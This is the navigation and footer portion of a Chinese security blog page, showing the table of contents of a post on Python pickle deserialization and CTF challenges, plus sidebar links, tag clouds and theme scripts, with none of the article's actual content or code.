href="#53-%E5%88%9D%E6%AD%A5%E8%AE%A4%E8%AF%86pickle-exp%E7%9A%84%E7%AE%80%E5%8D%95demo"><span class="toc-number">5.3.</span> <span class="toc-text">5.3 初步认识：pickle EXP的简单demo</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#54-%E5%A6%82%E4%BD%95%E6%89%8B%E5%86%99opcode"><span class="toc-number">5.4.</span> <span class="toc-text">5.4 如何手写opcode</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#541-%E5%B8%B8%E7%94%A8opcode%E8%A7%A3%E6%9E%90"><span class="toc-number">5.4.1.</span> <span class="toc-text">5.4.1 常用opcode解析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#542-%E6%8B%BC%E6%8E%A5opcode"><span class="toc-number">5.4.2.</span> <span class="toc-text">5.4.2 拼接opcode</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%85%A8%E5%B1%80%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96"><span class="toc-number">5.4.2.1.</span> <span class="toc-text">全局变量覆盖</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%87%BD%E6%95%B0%E6%89%A7%E8%A1%8C"><span class="toc-number">5.4.2.2.</span> <span class="toc-text">函数执行</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%9E%E4%BE%8B%E5%8C%96%E5%AF%B9%E8%B1%A1"><span class="toc-number">5.4.2.3.</span> <span class="toc-text">实例化对象</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#pker%E7%9A%84%E4%BD%BF%E7%94%A8%E6%8E%A8%E8%8D%90"><span class="toc-number">5.4.2.4.</span> <span class="toc-text">pker的使用（推荐）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9"><span class="toc-number">5.4.2.5.</span> <span class="toc-text">注意事项</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#543-ctf%E5%AE%9E%E6%88%98"><span class="toc-number">5.4.3.</span> <span class="toc-text">5.4.3 CTF实战</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%81%9A%E9%A2%98%E4%B9%8B%E5%89%8D%E4%BA%86%E8%A7%A3pickleunpicklerfind_class"><span class="toc-number">5.4.3.1.</span> <span class="toc-text">做题之前：了解pickle.Unpickler.find_class()</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%BB%95%E8%BF%87builtins"><span class="toc-number">5.4.3.1.1.</span> <span class="toc-text">绕过builtins</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#code-breakingpicklecode"><span class="toc-number">5.4.3.2.</span> <span class="toc-text">Code-Breaking:picklecode</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%AB%98%E6%A0%A1%E6%88%98%E7%96%AB%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9Bwebtmp"><span class="toc-number">5.4.3.3.</span> <span class="toc-text">高校战疫网络安全分享赛:webtmp</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ctf-case1"><span class="toc-number">5.4.3.4.</span> <span class="toc-text">CTF-case1</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x06-marshal-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">6.</span> <span class="toc-text">0x06 Marshal 反序列化</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x07-pass%E6%80%BB%E7%BB%93"><span class="toc-number">7.</span> <span class="toc-text">0x07 Pass总结</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#71-%E7%BB%95%E8%BF%87builtins"><span class="toc-number">7.1.</span> <span class="toc-text">7.1 绕过builtins</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%9D%E8%B7%AF%E4%B8%80"><span class="toc-number">7.1.1.</span> <span class="toc-text">思路一</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%9D%E8%B7%AF%E4%BA%8C"><span class="toc-number">7.1.2.</span> <span class="toc-text">思路二</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#72-%E7%BB%95%E8%BF%87r%E6%8C%87%E4%BB%A4"><span class="toc-number">7.2.</span> <span class="toc-text">7.2 绕过R指令</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#i%E6%8C%87%E4%BB%A4"><span class="toc-number">7.2.1.</span> <span class="toc-text">i指令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#o%E6%8C%87%E4%BB%A4"><span class="toc-number">7.2.2.</span> <span class="toc-text">o指令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#b%E6%8C%87%E4%BB%A4"><span class="toc-number">7.2.3.</span> <span class="toc-text">b指令</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#73-%E7%BB%95%E8%BF%87%E5%85%B3%E9%94%AE%E5%AD%97%E8%BF%87%E6%BB%A4"><span class="toc-number">7.3.</span> <span class="toc-text">7.3 绕过关键字过滤</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8v%E6%8C%87%E4%BB%A4%E8%BF%9B%E8%A1%8Cunicode%E7%BB%95%E8%BF%87"><span class="toc-number">7.3.1.</span> <span class="toc-text">利用V指令进行Unicode绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8D%81%E5%85%AD%E8%BF%9B%E5%88%B6%E7%BB%95%E8%BF%87"><span class="toc-number">7.3.2.</span> <span class="toc-text">十六进制绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E5%86%85%E7%BD%AE%E5%87%BD%E6%95%B0%E8%8E%B7%E5%8F%96%E5%85%B3%E9%94%AE%E5%AD%97"><span class="toc-number">7.3.3.</span> <span class="toc-text">利用内置函数获取关键字</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x08-pker%E4%BD%BF%E7%94%A8%E8%AF%B4%E6%98%8E"><span class="toc-number">8.</span> <span class="toc-text">0x08 pker使用说明</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#81-%E7%AE%80%E4%BB%8B"><span class="toc-number">8.1.</span> <span class="toc-text">8.1 简介</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#82-pker%E8%83%BD%E5%81%9A%E7%9A%84%E4%BA%8B"><span class="toc-number">8.2.</span> <span class="toc-text">8.2 pker能做的事</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#83-%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95%E4%B8%8E%E7%A4%BA%E4%BE%8B"><span class="toc-number">8.3.</span> <span class="toc-text">8.3 使用方法与示例</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#pker%E5%85%A8%E5%B1%80%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96"><span class="toc-number">8.3.1.</span> <span class="toc-text">pker：全局变量覆盖</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#pker%E5%87%BD%E6%95%B0%E6%89%A7%E8%A1%8C"><span class="toc-number">8.3.2.</span> <span class="toc-text">pker：函数执行</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#pker%E5%AE%9E%E4%BE%8B%E5%8C%96%E5%AF%B9%E8%B1%A1"><span class="toc-number">8.3.3.</span> <span class="toc-text">pker：实例化对象</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#84-ctf%E5%AE%9E%E6%88%98"><span class="toc-number">8.4.</span> <span class="toc-text">8.4 CTF实战</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ciscn2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-day1-web2ikun"><span class="toc-number">8.4.1.</span> <span class="toc-text">[CISCN2019 华北赛区 Day1 Web2]ikun</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#bandit-%E8%87%AA%E5%8A%A8%E5%8C%96%E5%B7%A5%E5%85%B7"><span class="toc-number">8.4.1.1.</span> <span class="toc-text">Bandit-自动化工具</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#watevrctf-2019pickle-store"><span class="toc-number">8.4.2.</span> <span class="toc-text">[watevrCTF-2019]Pickle Store</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x09-%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0"><span class="toc-number">9.</span> <span class="toc-text">0x09 参考文章</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-history"></i><span>最近发布</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/08/08/thm-yun-xing-shi-gui-bi-jian-ce/" title="THM-运行时规避检测">THM-运行时规避检测</a><time datetime="2024-08-08T14:19:16.000Z" title="发表于 2024-08-08 22:19:16">2024-08-08</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/08/08/thm-bypass-uac/" title="THM-ByPass_UAC">THM-ByPass_UAC</a><time datetime="2024-08-08T07:36:41.000Z" title="发表于 2024-08-08 15:36:41">2024-08-08</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/08/07/thm-qian-ming-gui-bi/" title="THM-签名规避">THM-签名规避</a><time datetime="2024-08-07T09:11:33.000Z" title="发表于 2024-08-07 17:11:33">2024-08-07</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/08/05/windows-ti-quan-zong-jie/" title="Windows提权总结">Windows提权总结</a><time datetime="2024-08-05T02:59:37.000Z" title="发表于 2024-08-05 10:59:37">2024-08-05</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/08/02/thm-dai-ma-hun-yao-yuan-li/" title="THM-代码混淆原理">THM-代码混淆原理</a><time datetime="2024-08-02T01:46:10.000Z" title="发表于 2024-08-02 09:46:10">2024-08-02</time></div></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"></div><div id="footer-bar"><div class="footer-bar-links"><div class="footer-bar-left"><div id="footer-bar-tips"><div class="copyright">&copy;2020 - 2024 By <a class="footer-bar-link" href="/" title="hybcx" target="_blank">hybcx</a></div></div><div id="footer-type-tips"></div></div><div class="footer-bar-right"><a class="footer-bar-link" target="_blank" rel="noopener" href="https://github.com/anzhiyu-c/hexo-theme-anzhiyu" title="主题">主题</a></div></div></div></footer></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="sidebar-site-data site-data is-center"><a href="/archives/" title="archive"><div class="headline">文章</div><div class="length-num">199</div></a><a href="/tags/" title="tag"><div class="headline">标签</div><div class="length-num">23</div></a><a href="/categories/" title="category"><div class="headline">分类</div><div class="length-num">30</div></a></div><span class="sidebar-menu-item-title">功能</span><div class="sidebar-menu-item"><a class="darkmode_switchbutton menu-child" href="javascript:void(0);" title="显示模式"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i><span>显示模式</span></a></div><div class="back-menu-list-groups"><div class="back-menu-list-group"><div class="back-menu-list-title">网页</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="https://blog.anheyu.com/" title="博客"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/img/favicon.ico" alt="博客"/><span class="back-menu-item-text">博客</span></a></div></div><div class="back-menu-list-group"><div class="back-menu-list-title">项目</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="http://yansedaima.com/" title="颜色代码表"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408121908150.svg" alt="颜色代码表"/><span class="back-menu-item-text">颜色代码表</span></a></div></div></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 文章</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/archives/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-box-archive"></use></svg><span> 隧道</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/categories/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-shapes"></use></svg><span> 分类</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/tags/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-tags"></use></svg><span> 标签</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 友链</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/link/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-link"></use></svg><span> 友人帐</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/fcircle/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-artstation"></use></svg><span> 朋友圈</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 我的</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/music/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-music"></use></svg><span> 音乐馆</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 关于</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/about/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-paper-plane"></use></svg><span> 关于本人</span></a></li><li><a class="site-page child faa-parent animated-hover" href="javascript:toRandomPost()"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-shoe-prints1"></use></svg><span> 随便逛逛</span></a></li></ul></div></div><span class="sidebar-menu-item-title">标签</span><div class="card-tags"><div class="item-headline"></div><div class="card-tag-cloud"><a href="/tags/CTF%E8%B5%9B%E4%BA%8B/" style="font-size: 0.88rem;">CTF赛事<sup>18</sup></a><a href="/tags/CVE/" style="font-size: 0.88rem;">CVE<sup>15</sup></a><a href="/tags/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" style="font-size: 0.88rem;">Java反序列化<sup>3</sup></a><a href="/tags/Java%E5%9F%BA%E7%A1%80/" style="font-size: 0.88rem;">Java基础<sup>1</sup></a><a href="/tags/Linux%E6%8F%90%E6%9D%83/" style="font-size: 0.88rem;">Linux提权<sup>2</sup></a><a href="/tags/MISC/" style="font-size: 0.88rem;">MISC<sup>1</sup></a><a href="/tags/Metasploit/" style="font-size: 0.88rem;">Metasploit<sup>3</sup></a><a href="/tags/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 0.88rem;">PHP代码审计<sup>2</sup></a><a href="/tags/SecBook/" style="font-size: 0.88rem;">SecBook<sup>1</sup></a><a href="/tags/TryHackMe/" style="font-size: 0.88rem;">TryHackMe<sup>36</sup></a><a href="/tags/Windows%E6%8F%90%E6%9D%83/" style="font-size: 0.88rem;">Windows提权<sup>2</sup></a><a href="/tags/reverse%E7%B3%BB%E5%88%97/" style="font-size: 0.88rem;">reverse系列<sup>2</sup></a><a href="/tags/tryhackme/" style="font-size: 0.88rem;">tryhackme<sup>1</sup></a><a href="/tags/web%E6%B8%97%E9%80%8F/" style="font-size: 0.88rem;">web渗透<sup>2</sup></a><a href="/tags/web%E7%9F%A5%E8%AF%86%E6%80%BB%E7%BB%93/" style="font-size: 0.88rem;">web知识总结<sup>2</sup></a><a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 0.88rem;">代码审计<sup>1</sup></a><a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" style="font-size: 0.88rem;">内网渗透<sup>3</sup></a><a href="/tags/%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA/" style="font-size: 0.88rem;">内网靶场<sup>2</sup></a><a href="/tags/%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AF%86/" style="font-size: 0.88rem;">基本知识<sup>21</sup></a><a href="/tags/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/" style="font-size: 0.88rem;">基础知识<sup>1</sup></a><a href="/tags/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/" style="font-size: 0.88rem;">攻防世界<sup>1</sup></a><a href="/tags/%E7%8E%84%E6%9C%BA%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E9%9D%B6%E5%9C%BA/" style="font-size: 0.88rem;">玄机应急响应靶场<sup>1</sup></a><a href="/tags/%E7%BA%A2%E9%98%9F%E6%B8%97%E9%80%8F/" style="font-size: 0.88rem;">红队渗透<sup>1</sup></a></div></div><hr/></div></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="anzhiyufont anzhiyu-icon-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="anzhiyufont anzhiyu-icon-arrows-left-right"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="anzhiyufont anzhiyu-icon-gear"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="anzhiyufont anzhiyu-icon-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="anzhiyufont anzhiyu-icon-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i></button></div></div><div id="nav-music"><a id="nav-music-hoverTips" onclick="anzhiyu.musicToggle()" accesskey="m">播放音乐</a><div id="console-music-bg"></div><meting-js id="8152976493" server="netease" type="playlist" mutex="true" preload="none" theme="var(--anzhiyu-main)" data-lrctype="0" order="random" volume="0.7"></meting-js></div><div id="algolia-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><button class="search-close-button"><i class="anzhiyufont anzhiyu-icon-xmark"></i></button></nav><div class="search-wrap"><div id="algolia-search-input"></div><hr/><div id="algolia-search-results"><div id="algolia-hits"></div><div id="algolia-pagination"></div><div id="algolia-info"><div class="algolia-stats"></div><div class="algolia-poweredBy"></div></div></div></div></div><div id="search-mask"></div></div><div id="rightMenu"><div class="rightMenu-group rightMenu-small"><div class="rightMenu-item" id="menu-backward"><i class="anzhiyufont anzhiyu-icon-arrow-left"></i></div><div class="rightMenu-item" id="menu-forward"><i class="anzhiyufont anzhiyu-icon-arrow-right"></i></div><div class="rightMenu-item" id="menu-refresh"><i class="anzhiyufont anzhiyu-icon-arrow-rotate-right" style="font-size: 1rem;"></i></div><div class="rightMenu-item" id="menu-top"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i></div></div><div class="rightMenu-group rightMenu-line rightMenuPlugin"><div class="rightMenu-item" id="menu-copytext"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制选中文本</span></div><div class="rightMenu-item" id="menu-pastetext"><i class="anzhiyufont anzhiyu-icon-paste"></i><span>粘贴文本</span></div><a class="rightMenu-item" id="menu-commenttext"><i class="anzhiyufont anzhiyu-icon-comment-medical"></i><span>引用到评论</span></a><div class="rightMenu-item" id="menu-newwindow"><i class="anzhiyufont anzhiyu-icon-window-restore"></i><span>新窗口打开</span></div><div class="rightMenu-item" id="menu-copylink"><i class="anzhiyufont anzhiyu-icon-link"></i><span>复制链接地址</span></div><div class="rightMenu-item" id="menu-copyimg"><i class="anzhiyufont anzhiyu-icon-images"></i><span>复制此图片</span></div><div class="rightMenu-item" id="menu-downloadimg"><i class="anzhiyufont anzhiyu-icon-download"></i><span>下载此图片</span></div><div class="rightMenu-item" id="menu-newwindowimg"><i class="anzhiyufont anzhiyu-icon-window-restore"></i><span>新窗口打开图片</span></div><div class="rightMenu-item" id="menu-search"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span>站内搜索</span></div><div class="rightMenu-item" id="menu-searchBaidu"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span>百度搜索</span></div><div class="rightMenu-item" id="menu-music-toggle"><i class="anzhiyufont anzhiyu-icon-play"></i><span>播放音乐</span></div><div class="rightMenu-item" id="menu-music-back"><i class="anzhiyufont anzhiyu-icon-backward"></i><span>切换到上一首</span></div><div class="rightMenu-item" id="menu-music-forward"><i class="anzhiyufont anzhiyu-icon-forward"></i><span>切换到下一首</span></div><div class="rightMenu-item" id="menu-music-playlist" onclick="window.open(&quot;https://y.qq.com/n/ryqq/playlist/8802438608&quot;, &quot;_blank&quot;);" style="display: none;"><i class="anzhiyufont anzhiyu-icon-radio"></i><span>查看所有歌曲</span></div><div class="rightMenu-item" id="menu-music-copyMusicName"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制歌名</span></div></div><div class="rightMenu-group rightMenu-line rightMenuOther"><a class="rightMenu-item menu-link" id="menu-randomPost"><i class="anzhiyufont anzhiyu-icon-shuffle"></i><span>随便逛逛</span></a><a class="rightMenu-item menu-link" href="/categories/"><i class="anzhiyufont anzhiyu-icon-cube"></i><span>博客分类</span></a><a class="rightMenu-item menu-link" href="/tags/"><i class="anzhiyufont anzhiyu-icon-tags"></i><span>文章标签</span></a></div><div class="rightMenu-group rightMenu-line rightMenuOther"><a class="rightMenu-item" id="menu-copy" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制地址</span></a><a class="rightMenu-item" id="menu-commentBarrage" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-message"></i><span class="menu-commentBarrage-text">关闭热评</span></a><a class="rightMenu-item" id="menu-darkmode" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i><span class="menu-darkmode-text">深色模式</span></a><a class="rightMenu-item" id="menu-translate" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-language"></i><span>轉為繁體</span></a></div></div><div id="rightmenu-mask"></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.cbd.int/medium-zoom@1.1.0/dist/medium-zoom.min.js"></script><script src="https://cdn.cbd.int/instant.page@5.2.0/instantpage.js" type="module"></script><script src="https://cdn.cbd.int/vanilla-lazyload@17.8.5/dist/lazyload.iife.min.js"></script><script src="https://cdn.cbd.int/node-snackbar@0.1.16/dist/snackbar.min.js"></script><canvas id="universe"></canvas><script async src="https://npm.elemecdn.com/anzhiyu-theme-static@1.0.0/dark/dark.js"></script><script>// 消除控制台打印
var HoldLog = console.log;
console.log = function () {};
let now1 = new Date();
queueMicrotask(() => {
  const Log = function () {
    HoldLog.apply(console, arguments);
  }; //在恢复前输出日志
  const grt = new Date("04/01/2021 00:00:00"); //此处修改你的建站时间或者网站上线时间
  now1.setTime(now1.getTime() + 250);
  const days = (now1 - grt) / 1000 / 60 / 60 / 24;
  const dnum = Math.floor(days);
  const ascll = [
    `欢迎使用安知鱼!`,
    `生活明朗, 万物可爱`,
    `
        
       █████╗ ███╗   ██╗███████╗██╗  ██╗██╗██╗   ██╗██╗   ██╗
      ██╔══██╗████╗  ██║╚══███╔╝██║  ██║██║╚██╗ ██╔╝██║   ██║
      ███████║██╔██╗ ██║  ███╔╝ ███████║██║ ╚████╔╝ ██║   ██║
      ██╔══██║██║╚██╗██║ ███╔╝  ██╔══██║██║  ╚██╔╝  ██║   ██║
      ██║  ██║██║ ╚████║███████╗██║  ██║██║   ██║   ╚██████╔╝
      ╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝╚═╝   ╚═╝    ╚═════╝
        
        `,
    "已上线",
    dnum,
    "天",
    "©2020 By 安知鱼 V1.6.12",
  ];
  const ascll2 = [`NCC2-036`, `调用前置摄像头拍照成功，识别为【小笨蛋】.`, `Photo captured: `, `🤪`];

  setTimeout(
    Log.bind(
      console,
      `\n%c${ascll[0]} %c ${ascll[1]} %c ${ascll[2]} %c${ascll[3]}%c ${ascll[4]}%c ${ascll[5]}\n\n%c ${ascll[6]}\n`,
      "color:#425AEF",
      "",
      "color:#425AEF",
      "color:#425AEF",
      "",
      "color:#425AEF",
      ""
    )
  );
  setTimeout(
    Log.bind(
      console,
      `%c ${ascll2[0]} %c ${ascll2[1]} %c \n${ascll2[2]} %c\n${ascll2[3]}\n`,
      "color:white; background-color:#4fd953",
      "",
      "",
      'background:url("https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/tinggge.gif") no-repeat;font-size:450%'
    )
  );

  setTimeout(Log.bind(console, "%c WELCOME %c 你好，小笨蛋.", "color:white; background-color:#4f90d9", ""));

  setTimeout(
    console.warn.bind(
      console,
      "%c ⚡ Powered by 安知鱼 %c 你正在访问 hybcx 的博客.",
      "color:white; background-color:#f0ad4e",
      ""
    )
  );

  setTimeout(Log.bind(console, "%c W23-12 %c 你已打开控制台.", "color:white; background-color:#4f90d9", ""));

  setTimeout(
    console.warn.bind(console, "%c S013-782 %c 你现在正处于监控中.", "color:white; background-color:#d9534f", "")
  );
});</script><script async src="/anzhiyu/random.js"></script><script src="https://cdn.cbd.int/algoliasearch@4.18.0/dist/algoliasearch-lite.umd.js"></script><script src="https://cdn.cbd.int/instantsearch.js@4.60.0/dist/instantsearch.production.min.js"></script><script src="/js/search/algolia.js"></script><div class="js-pjax"><script>(() => {
  const initValine = () => {
    const valine = new Valine(Object.assign({
      el: '#vcomment',
      appId: '7Sc5uZwcoDwvbgqkpwGKyCpN-gzGzoHsz',
      appKey: 'iEFJUGMm2FY91n9ZG1gdKBSy',
      avatar: 'mp',
      serverURLs: '',
      emojiMaps: "",
      path: window.location.pathname,
      visitor: false
    }, null))
  }

  const loadValine = async () => {
    if (typeof Valine === 'function') initValine()
    else {
      await getScript('https://cdn.cbd.int/valine@1.5.1/dist/Valine.min.js')
      initValine()
    }
  }

  if ('Valine' === 'Valine' || !false) {
    if (false) anzhiyu.loadComment(document.getElementById('vcomment'),loadValine)
    else setTimeout(loadValine, 0)
  } else {
    window.loadOtherComment = loadValine
  }
})()</script><input type="hidden" name="page-type" id="page-type" value="post"></div><script src="https://cdn.cbd.int/blueimp-md5@2.19.0/js/md5.min.js"></script><script>window.addEventListener('load', () => {
  const changeContent = (content) => {
    if (content === '') return content

    content = content.replace(/<img.*?src="(.*?)"?[^\>]+>/ig, '[图片]') // replace image link
    content = content.replace(/<a[^>]+?href=["']?([^"']+)["']?[^>]*>([^<]+)<\/a>/gi, '[链接]') // replace url
    content = content.replace(/<pre><code>.*?<\/pre>/gi, '[代码]') // replace code
    content = content.replace(/<[^>]+>/g,"") // remove html tag

    if (content.length > 150) {
      content = content.substring(0,150) + '...'
    }
    return content
  }

  const getIcon = (icon, mail) => {
    if (icon) return icon
    let defaultIcon = '?d=mp'
    let iconUrl = `https://gravatar.loli.net/avatar/${md5(mail.toLowerCase()) + defaultIcon}`
    return iconUrl
  }

  const generateHtml = array => {
    let result = ''

    if (array.length) {
      for (let i = 0; i < array.length; i++) {
        result += '<div class=\'aside-list-item\'>'

        if (true) {
          const name = 'data-lazy-src'
          result += `<a href='${array[i].url}' class='thumbnail'><img ${name}='${array[i].avatar}' alt='${array[i].nick}'></a>`
        }

        result += `<div class='content'>
        <a class='comment' href='${array[i].url}' title='${array[i].content}'>${array[i].content}</a>
        <div class='name'><span>${array[i].nick} / </span><time datetime="${array[i].date}">${anzhiyu.diffDate(array[i].date, true)}</time></div>
        </div></div>`
      }
    } else {
      result += '没有评论'
    }

    let $dom = document.querySelector('#card-newest-comments .aside-list')
    $dom && ($dom.innerHTML= result)
    window.lazyLoadInstance && window.lazyLoadInstance.update()
    window.pjax && window.pjax.refresh($dom)
  }

  const getComment = () => {
    const serverURL = 'https://7Sc5uZwc.api.lncldglobal.com'

    var settings = {
      "method": "GET",
      "headers": {
        "X-LC-Id": '7Sc5uZwcoDwvbgqkpwGKyCpN-gzGzoHsz',
        "X-LC-Key": 'iEFJUGMm2FY91n9ZG1gdKBSy',
        "Content-Type": "application/json"
      },
    }

    fetch(`${serverURL}/1.1/classes/Comment?limit=6&order=-createdAt`,settings)
      .then(response => response.json())
      .then(data => {
        const valineArray = data.results.map(function (e) {
          return {
            'avatar': getIcon(e.QQAvatar, e.mail),
            'content': changeContent(e.comment),
            'nick': e.nick,
            'url': e.url + '#' + e.objectId,
            'date': e.updatedAt,
          }
        })
        saveToLocal.set('valine-newest-comments', JSON.stringify(valineArray), 10/(60*24))
        generateHtml(valineArray)
      }).catch(e => {
        const $dom = document.querySelector('#card-newest-comments .aside-list')
        $dom.textContent= "无法获取评论，请确认相关配置是否正确"
      }) 
  }

  const newestCommentInit = () => {
    if (document.querySelector('#card-newest-comments .aside-list')) {
      const data = saveToLocal.get('valine-newest-comments')
      if (data) {
        generateHtml(JSON.parse(data))
      } else {
        getComment()
      }
    }
  }

  newestCommentInit()
  document.addEventListener('pjax:complete', newestCommentInit)
})</script><script async data-pjax src="https://npm.elemecdn.com/anzhiyu-theme-static@1.0.1/bubble/bubble.js"></script><script>var visitorMail = "";
